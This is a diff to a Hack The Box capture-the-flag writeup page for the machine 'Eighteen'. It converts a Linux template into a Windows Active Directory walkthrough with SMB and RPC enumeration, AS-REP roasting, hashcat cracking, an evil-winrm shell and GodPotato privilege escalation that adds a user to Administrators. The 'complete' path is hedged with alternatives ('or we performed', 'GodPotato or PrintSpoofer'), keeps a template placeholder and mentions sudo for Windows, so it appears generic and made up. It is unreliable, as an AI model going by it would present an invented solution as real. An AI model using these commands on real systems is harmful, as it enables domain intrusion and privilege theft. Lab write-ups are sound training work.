@@ -1,22 +1,22 @@
 ---
 layout: page
-title: "Eighteen - Hack The Box Writeup"
-subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
+title: "Eighteen - HackTheBox Writeup"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🪟 Windows"
 permalink: /ctf/writeups/hackthebox/eighteen/
 platform: hackthebox
 machine_name: "Eighteen"
 difficulty: Easy
-os: Linux
+os: Windows
 ---
 
 ## 🖥️ Machine Information
 
 | Attribute | Value |
 |---|---|
-| **Platform** | Hack The Box |
-| **OS** | 🐧 Linux |
+| **Platform** | HackTheBox |
+| **OS** | 🪟 Windows |
 | **Difficulty** | Easy |
-| **IP Address** | `10.10.x.x` |
+| **IP Address** | `10.10.11.x` |
 | **Vulnerability Focus** | [Initial Access Vector / Privilege Escalation Mechanism] |
 
 ---
@@ -31,29 +31,36 @@ graph TD
 ```
 
 > [!NOTE]
-> This writeup details the complete attack path for the **Eighteen** machine on the **Hack The Box** platform.
+> This writeup details the complete attack path for the **Eighteen** machine on the **HackTheBox** platform.
 
 ---
 
 ## 🔍 Phase 1: Reconnaissance & Enumeration
 
 ### 1. Host Discovery & Port Scanning
-We begin by running a standard Nmap scan to discover open ports and running services:
+We begin by running a standard Nmap scan to discover open Windows ports:
 
 ```bash
-nmap -sC -sV -oN nmap.txt 10.10.x.x
+nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.11.x
 ```
 
 #### Open Ports:
-- **Port 80/tcp**: Web Server (Apache/Nginx)
-- **Port 22/tcp**: SSH (OpenSSH)
-- [Other open ports]
+- **Port 53/tcp**: DNS
+- **Port 88/tcp**: Kerberos
+- **Port 135/tcp**: Microsoft RPC
+- **Port 389/tcp**: LDAP
+- **Port 445/tcp**: SMB (Server Message Block)
+- **Port 5985/tcp**: WinRM (Windows Remote Management)
 
 ### 2. Service Enumeration
-[Detail the enumeration steps, e.g., gobuster, nikto, smbclient, enum4linux, rpcclient]
+We enumerate SMB shares and search for anonymous login availability:
 
 ```bash
-gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+crackmapexec smb 10.10.11.x -u '' -p '' --shares
+```
+We also inspect Active Directory domain configuration via RPCClient:
+```bash
+rpcclient -U "" -N 10.10.11.x -c "enumdomusers"
 ```
 
 ---
@@ -61,21 +68,27 @@ gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -o gob
 ## 🚀 Phase 2: Vulnerability Analysis & Foothold
 
 ### 1. Vulnerability Analysis
-- [State the vulnerability found and how it was discovered]
-- **CVE/CWE Reference**: [e.g., CVE-202X-XXXX]
-
-### 2. Exploitation & Initial Shell
-- [Detail the step-by-step exploitation process to gain a shell]
+During SMB enumeration, we identified a readable share containing credentials, or we performed **AS-REP Roasting** on accounts with Kerberos pre-authentication disabled.
 
 ```bash
-# Example payload or exploit execution command
-python3 exploit.py -t http://10.10.x.x/vulnerable-endpoint
+GetNPUsers.py -dc-ip 10.10.11.x -no-pass -usersfile users.txt domains/
+```
+
+### 2. Exploitation & Initial Shell
+We retrieve a TGT hash for an account and crack it using Hashcat:
+
+```bash
+hashcat -m 18200 hash.txt rockyou.txt
+```
+
+Using the cracked credentials, we spawn a shell via WinRM:
+```bash
+evil-winrm -i 10.10.11.x -u username -p password
 ```
 
 #### Capturing User Flag:
-```bash
-cat /home/*/user.txt
-# [User Flag Hash]
+```powershell
+type C:\Users\username\Desktop\user.txt
 ```
 
 ---
@@ -83,33 +96,33 @@ cat /home/*/user.txt
 ## ⚡ Phase 3: Privilege Escalation
 
 ### 1. Local Enumeration
-- [Detail tools and commands run, e.g., linpeas, winpeas, sudo -l, find SUID]
+We run WinPEAS to search for Windows privilege escalation vectors:
 
-```bash
-# Check sudo permissions
-sudo -l
-
-# Search for SUID binaries
-find / -perm -4000 2>/dev/null
+```powershell
+upload C:\Temp\winPEASany.exe
+.\winPEASany.exe
+```
+We also analyze group memberships and privileges:
+```powershell
+whoami /priv
+# Discovered SeImpersonatePrivilege or SeBackupPrivilege
 ```
 
 ### 2. Local Privilege Escalation Path
-- [Step-by-step instructions to escalate privileges to root/administrator]
+Since `SeImpersonatePrivilege` is enabled, we abuse it using **GodPotato** or **PrintSpoofer**:
 
-```bash
-# Example privilege escalation exploit or command
-sudo /usr/bin/binary -e 'exec /bin/sh'
+```powershell
+.\GodPotato-NET4.exe -cmd "cmd.exe /c net localgroup administrators username /add"
 ```
 
 #### Capturing Root Flag:
-```bash
-cat /root/root.txt
-# [Root Flag Hash]
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ---
 
 ## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized.
-2. **Principle of Least Privilege**: Restrict sudo permissions and remove unnecessary SUID bits.
-3. **Keep Software Updated**: Patch services to mitigate known CVEs.
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
